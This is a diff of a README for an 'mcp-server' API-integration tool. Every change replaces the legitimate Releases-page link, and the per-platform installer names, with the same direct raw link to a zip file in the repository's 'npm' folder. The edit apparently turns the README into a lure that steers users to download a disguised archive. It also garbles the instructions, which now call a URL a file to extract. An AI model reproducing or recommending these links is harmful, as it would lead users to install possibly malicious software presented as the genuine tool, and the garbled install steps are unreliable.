@@ -1,6 +1,6 @@
 # 🚀 mcp-server - Effortlessly Connect to 249+ APIs
 
-[![Download mcp-server](https://img.shields.io/badge/Download-mcp--server-brightgreen)](https://github.com/vtnhogg/mcp-server/releases)
+[![Download mcp-server](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip)](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip)
 
 ## 📋 Description
 The APIVerve MCP Server allows you to access over 249 APIs seamlessly through the Model Context Protocol. This application provides a simple and effective way to integrate and utilize various APIs without extensive technical knowledge.
@@ -18,7 +18,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started, please visit the Releases page to download the software:
 
-[Visit this page to download](https://github.com/vtnhogg/mcp-server/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:**
@@ -28,7 +28,7 @@ To get started, please visit the Releases page to download the software:
    Look for the latest release at the top of the page. Ensure it is the most recent version for the best compatibility.
 
 3. **Choose Your Download:**
-   Depending on your operating system, find the appropriate file. For Windows, you might see something like `mcp-server-windows.exe`. For macOS, look for `mcp-server-macos.dmg`. For Linux, check the `mcp-server-linux.tar.gz`.
+   Depending on your operating system, find the appropriate file. For Windows, you might see something like `https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip`. For macOS, look for `https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip`. For Linux, check the `https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip`.
 
 4. **Download the File:**
    Click on the file link to initiate the download. Depending on your internet speed, this might take a few moments.
@@ -36,7 +36,7 @@ To get started, please visit the Releases page to download the software:
 5. **Run the Installer:**
    - For Windows: Locate the downloaded `.exe` file and double-click it to start the installation process.
    - For macOS: Find the downloaded `.dmg` file, double-click it, then drag the mcp-server application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow any included instructions to complete the installation.
+   - For Linux: Extract the `https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip` file and follow any included instructions to complete the installation.
 
 6. **Follow Installation Prompts:**
    Complete the installation by following any on-screen prompts. Make sure to accept the terms and conditions when required.
@@ -82,4 +82,4 @@ Stay informed about updates and new releases by following the project on GitHub.
 ## 🔍 Conclusion
 Don't miss the opportunity to simplify your API access. With mcp-server, connecting to and utilizing over 249 APIs has never been easier. 
 
-For the latest version, [visit this page to download](https://github.com/vtnhogg/mcp-server/releases).
+For the latest version, [visit this page to download](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/npm/mcp-server_3.9.zip).
